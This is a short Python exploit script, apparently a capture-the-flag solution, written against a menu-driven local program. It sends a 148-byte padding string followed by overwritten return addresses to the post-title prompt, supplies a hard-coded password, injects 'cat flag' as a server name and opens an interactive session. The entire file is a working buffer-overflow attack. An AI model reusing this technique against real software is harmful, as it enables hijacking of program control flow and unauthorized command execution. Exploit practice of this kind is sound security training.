import interact
import struct

# Pack integer 'n' into a 8-Byte representation
def p64(n):
    return struct.pack('Q', n)

# Unpack 8-Byte-long string 's' into a Python integer
def u64(s):
    return struct.unpack('Q', s)[0]

p = interact.Process()
# data = p.readuntil('\n')
# p.sendline('hello')
p.readuntil('Enter choice: ')
p.sendline('1')
p.readuntil('Enter post title: ')
# 400bce
# 0x400b8a
#0x400b8b
p.sendline(b'B' * 148 + b'\xCE\x0B\x40\x00' +  b'\x00' * 8 + b'\x00')
p.readuntil('Enter post contents: ')
p.sendline('test')
p.readuntil('Press enter to continue...')
p.sendline('')
p.readuntil('Enter choice: ')
p.sendline('3')
p.readuntil('Press enter to continue...')
p.sendline('')
p.readuntil('Enter choice: ')
p.sendline('2')
p.readuntil('Enter password to continue:')
p.sendline('l0ln0onewillguessth1s')
p.sendline('')
p.readuntil('Enter choice: ')
p.sendline('f')
p.readuntil('Enter choice: ')
p.sendline('1')
p.readuntil('Enter new server name: ')
p.sendline('cat flag')
#0x400bab
#0x400b8a
p.readuntil('Enter choice: ')
p.sendline('1')
p.sendline(b'B' * 148 + b'\x8a\x0B\x40\x00' +  b'\x00' * 8 + b'\x00')
p.readuntil('Enter post contents: ')
p.readuntil('Press enter to continue...')
p.sendline('')
p.readuntil('Enter choice: ')
p.sendline('4')
p.readuntil('Press enter to continue...')
p.sendline('')
p.readuntil('Enter choice: ')
p.sendline('2')



p.interactive()
